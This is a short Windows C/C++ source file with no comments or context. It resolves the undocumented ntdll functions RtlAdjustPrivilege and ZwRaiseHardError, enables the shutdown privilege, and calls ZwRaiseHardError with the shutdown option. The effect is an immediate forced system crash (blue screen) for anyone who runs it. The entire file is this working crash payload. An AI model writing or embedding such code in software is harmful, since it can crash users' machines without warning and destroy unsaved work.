#include <windows.h>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(
        ULONG privilege,
        BOOLEAN enable,
        BOOLEAN current_thread,
        PBOOLEAN enabled);

typedef NTSTATUS(NTAPI *pdef_ZwRaiseHardError)(
        NTSTATUS error_status,
        ULONG number_of_parameters,
        ULONG unicode_string_parameter_mask,
        PULONG_PTR parameters,
        ULONG response_option,
        PULONG reponse);

int main() {
    auto ntdll = LoadLibraryA("ntdll.dll");
    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(ntdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0) {
        auto ZwRaiseHardError = (pdef_ZwRaiseHardError) GetProcAddress(ntdll, "ZwRaiseHardError");
        ULONG response;
        ZwRaiseHardError((NTSTATUS) 0xC0000002, 0, 0, nullptr, OPTION_SHUTDOWN, &response);
    }
}